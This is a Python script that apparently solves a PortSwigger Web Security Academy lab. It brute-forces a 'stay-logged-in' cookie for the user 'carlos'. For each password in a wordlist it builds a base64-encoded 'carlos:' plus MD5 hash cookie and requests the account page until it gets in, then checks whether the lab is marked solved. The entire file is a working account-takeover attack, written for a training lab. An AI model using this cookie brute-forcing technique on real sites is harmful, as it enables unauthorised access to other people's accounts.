# Brute-forcing a stay-logged-in cookie

# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import hashlib
import base64
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def encode_cookie(password):
	md5value = hashlib.md5(password.encode()).hexdigest()
	str = f'carlos:{md5value}'
	b64 = base64.b64encode(str.encode())
	return b64.decode()

def connect_as_carlos(s, url):
	print('\n[+] Brute-forcing the "stay-logged-in" cookie value...')

	account_path = url + '/my-account'
	with open('./passwords.txt') as f:
		for line in f:
			password = line.strip()
			sys.stdout.write('\r[+] Trying password:\t%s%s' % (password, ' ' * (12 - len(password))))
			cookie = encode_cookie(password)
			cookies = {'stay-logged-in': cookie}
			r = s.get(account_path, cookies=cookies, allow_redirects=False)
			sys.stdout.flush()
			if 'Your username is: carlos' in r.text:
				print('\n[+] Logged in as Carlos !')
				return r
	print(f'[-] Brute force failed <!>')
	sys.exit(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Brute-forcing a stay-logged-in cookie')
	parser = argparse.ArgumentParser(description="[+] Lab: Brute-forcing a stay-logged-in cookie")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(args.url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to access Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(args.url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = connect_as_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
